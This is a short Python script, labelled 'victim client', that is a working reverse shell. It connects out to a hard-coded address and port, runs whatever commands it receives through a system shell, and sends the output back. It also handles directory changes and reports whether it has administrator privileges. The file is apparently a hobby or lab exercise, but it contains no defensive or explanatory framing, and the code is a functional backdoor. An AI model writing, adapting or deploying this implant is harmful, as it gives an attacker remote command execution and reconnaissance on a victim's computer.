# victim client

import socket
import subprocess
import os
import ctypes

ip = "172.25.191.60"
port = 8080

# https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
def is_admin() -> bool:
    if os.name == "nt":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif os.name == "posix":
        return os.getuid() == 0
    else:
        return False

def connect():
    Mysocket = socket.socket()
    Mysocket.connect((ip, port))

    while True:
        command = Mysocket.recv(5000)
        if "terminate" in command.decode():
            Mysocket.close()
            break


        # command format: "cd<space><Path name>"
        # split using the space between 'cd' and path name
        # ... (because, path name also may have spaces, that confuses the script)
        #and explicitly tell the operating system to change the directory
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + str(os.getcwd())
                Mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                Mysocket.send(informToServer.encode())


        elif 'checkUserLevel' in command.decode():
            try:
                if is_admin():
                    informToServer = '[!] Administrator Privileges'
                else:
                    informToServer = '[!!] User Privileges. (No Admin privileges)'
                Mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                Mysocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            Mysocket.send(CMD.stdout.read())
            Mysocket.send(CMD.stderr.read())
def main():
    connect()
if __name__ == "__main__":
    main()
